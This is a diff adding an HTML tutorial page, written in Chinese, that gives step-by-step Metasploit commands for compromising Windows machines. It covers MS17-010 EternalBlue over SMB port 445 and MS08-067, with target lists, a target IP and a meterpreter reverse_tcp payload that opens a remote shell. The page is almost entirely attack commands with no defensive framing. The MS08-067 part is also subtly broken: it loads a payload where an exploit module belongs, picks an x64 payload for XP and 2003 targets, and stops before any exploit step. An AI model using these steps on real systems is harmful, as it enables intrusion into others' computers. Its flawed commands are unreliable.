@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>教程</title>
+	<link href="../css/page2.css" rel="stylesheet">
+</head>
+<body>
+<!--最外边框设置-->
+	<div class="zuiwaikuang">
+		<div class="biankuang">
+		<h2>1：MS17-010</h2><h5>通过445端口对计算机实施入侵</h5>
+		<hr size="0px">
+		<p>漏洞适用系统</p>
+		<code>  Id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;Name
+			<br>
+			----------------------------------------
+			<br>
+			0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+		 </code>
+		<p>1：开启postgresql服务</p>
+		<code>1 | msf &gt; service postgresql start</code>
+		<p>2：运行msf控制台</p>
+		<code>2 | msf &gt; msfconsole</code>
+		<p>3：搜索MS17-010</p>
+		<code>3 | msf &gt; search ms17-010</code>
+		<p>4：使用漏洞扫描模块</p>
+		<code>4 | msf &gt; use  auxiliary/scanner/smb/smb_ms17_010</code>
+		<p>5：查看配置信息</p>
+		<code>5 | msf &gt; show options</code>
+		<p>6：设置目标ip</p>
+		<code>6 | msf &gt; set rhost 192.168.1.111</code>
+		<p>7：运行扫描，回显出现（100% complete）即为有漏洞</p>
+		<code>7 | msf &gt; run</code>
+		<p>8：搜索漏洞攻击模块</p>
+		<code>8 | msf &gt; search ms17-010</code>
+		<p>9：使用漏洞攻击模块</p>
+		<code>9 | msf &gt; use exploit/windows/smb/ms17_010_eternalblue</code>
+		<p>10：查看需要配置的信息</p>
+		<code>10 | msf &gt; show options</code>
+		<p>11：设置目标ip</p>
+		<code>11 | msf &gt; set rhost[IP地址]</code>
+		<p>12：设置payload</p>
+		<code>12 | msf &gt; set payload windows/x64/meterpreter/reverse_tcp</code>
+		<p>13：攻击靶机</p>
+		<code>13 | msf &gt; exploit</code>
+		<p>14：出现此回显即为成功</p>
+		<code>14 | metasploit &gt;</code>
+		<div style="background-color: aquamarine;">
+		<hr>
+		<br>
+		<br>
+		<hr>
+		</div>
+		<h2>2：MS08-067</h2><h5>通过Server服务的RPC请求造成内存溢出蓝屏崩溃</h5>
+		<hr size="0px;">
+		<p>漏洞适用系统</p>
+		<code>Id &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; Name
+			<br>
+			----------------------------------------
+			<br>
+			0   Automatic Targeting
+			<br>
+			1   Windows 2000 Universal
+			<br>
+			2   Windows XP SP0/SP1 Universal
+			<br>
+			3   Windows 2003 SP0 Universal
+			<br>
+			4   Windows XP SP2 English (AlwaysOn NX)
+			<br>
+			5   Windows XP SP2 English (NX)
+			<br>
+			6   Windows XP SP3 English (AlwaysOn NX)
+			<br>
+			7   Windows XP SP3 English (NX)
+			<br>
+			8   Windows XP SP2 Arabic (NX)
+			<br>
+			9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)
+			<br>
+			10  Windows XP SP2 Chinese - Simplified (NX)
+			<br>
+			11  Windows XP SP2 Chinese - Traditional (NX)
+			<br>
+			12  Windows XP SP2 Czech (NX)
+			<br>
+			13  Windows XP SP2 Danish (NX)
+			<br>
+			14  Windows XP SP2 German (NX)
+			<br>
+			15  Windows XP SP2 Greek (NX)
+			<br>
+			16  Windows XP SP2 Spanish (NX)
+			<br>
+			17  Windows XP SP2 Finnish (NX)
+			<br>
+			18  Windows XP SP2 French (NX)
+			<br>
+			19  Windows XP SP2 Hebrew (NX)
+			<br>
+			20  Windows XP SP2 Hungarian (NX)
+			<br>
+			21  Windows XP SP2 Italian (NX)
+			<br>
+			22  Windows XP SP2 Japanese (NX)
+			<br>
+			23  Windows XP SP2 Korean (NX)
+			<br>
+			24  Windows XP SP2 Dutch (NX)
+			<br>
+			25  Windows XP SP2 Norwegian (NX)
+			<br>
+			26  Windows XP SP2 Polish (NX)
+			<br>
+			27  Windows XP SP2 Portuguese - Brazilian (NX)
+			<br>
+			28  Windows XP SP2 Portuguese (NX)
+			<br>
+			29  Windows XP SP2 Russian (NX)
+			<br>
+			30  Windows XP SP2 Swedish (NX)
+			<br>
+			31  Windows XP SP2 Turkish (NX)
+			<br>
+			32  Windows XP SP3 Arabic (NX)
+			<br>
+			33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)
+			<br>
+			34  Windows XP SP3 Chinese - Simplified (NX)
+			<br>
+			35  Windows XP SP3 Chinese - Traditional (NX)
+			<br>
+			36  Windows XP SP3 Czech (NX)
+			<br>
+			37  Windows XP SP3 Danish (NX)
+			<br>
+			38  Windows XP SP3 German (NX)
+			<br>
+			39  Windows XP SP3 Greek (NX)
+			<br>
+			40  Windows XP SP3 Spanish (NX)
+			<br>
+			41  Windows XP SP3 Finnish (NX)
+			<br>
+			42  Windows XP SP3 French (NX)
+			<br>
+			43  Windows XP SP3 Hebrew (NX)
+			<br>
+			44  Windows XP SP3 Hungarian (NX)
+			<br>
+			45  Windows XP SP3 Italian (NX)
+			<br>
+			46  Windows XP SP3 Japanese (NX)
+			<br>
+			47  Windows XP SP3 Korean (NX)
+			<br>
+			48  Windows XP SP3 Dutch (NX)
+			<br>
+			49  Windows XP SP3 Norwegian (NX)
+			<br>
+			50  Windows XP SP3 Polish (NX)
+			<br>
+			51  Windows XP SP3 Portuguese - Brazilian (NX)
+			<br>
+			52  Windows XP SP3 Portuguese (NX)
+			<br>
+			53  Windows XP SP3 Russian (NX)
+			<br>
+			54  Windows XP SP3 Swedish (NX)
+			<br>
+			55  Windows XP SP3 Turkish (NX)
+			<br>
+			56  Windows 2003 SP1 English (NO NX)
+			<br>
+			57  Windows 2003 SP1 English (NX)
+			<br>
+			58  Windows 2003 SP1 Japanese (NO NX)
+			<br>
+			59  Windows 2003 SP1 Spanish (NO NX)
+			<br>
+			60  Windows 2003 SP1 Spanish (NX)
+			<br>
+			61  Windows 2003 SP1 French (NO NX)
+			<br>
+			62  Windows 2003 SP1 French (NX)
+			<br>
+			63  Windows 2003 SP2 English (NO NX)
+			<br>
+			64  Windows 2003 SP2 English (NX)
+			<br>
+			65  Windows 2003 SP2 German (NO NX)
+			<br>
+			66  Windows 2003 SP2 German (NX)
+			<br>
+			67  Windows 2003 SP2 Portuguese - Brazilian (NX)
+			<br>
+			68  Windows 2003 SP2 Spanish (NO NX)
+			<br>
+			69  Windows 2003 SP2 Spanish (NX)
+			<br>
+			70  Windows 2003 SP2 Japanese (NO NX)
+			<br>
+			71  Windows 2003 SP2 French (NO NX)
+			<br>
+			72  Windows 2003 SP2 French (NX)
+		 </code>
+		 <hr>
+		<p>1：开启postgresql服务</p>
+		<code>1 | msf &gt; service postgresql start</code>
+		<p>2：运行msf控制台</p>
+		<code>2 | msf &gt; msfconsole</code>
+		<p>3：搜索MS08-067</p>
+		<code>3 | msf &gt; search ms08-067</code>
+		<p>4：使用漏洞模块</p>
+		<code>4 | msf &gt; use windows/meterpreter/reverse_tcp</code>
+		<p>5：查看配置信息</p>
+		<code>5 | msf &gt; show options</code>
+		<p>6：设置靶机ip地址</p>
+		<code>6 | msf &gt; set rhost[IP地址]</code>
+		<p>7：设置攻击载荷</p>
+		<code>7 | msf &gt; set payload windows/x64/meterpreter/reverse_tcp</code>	
+	</div>
+	</div>
+</body>
+</html>
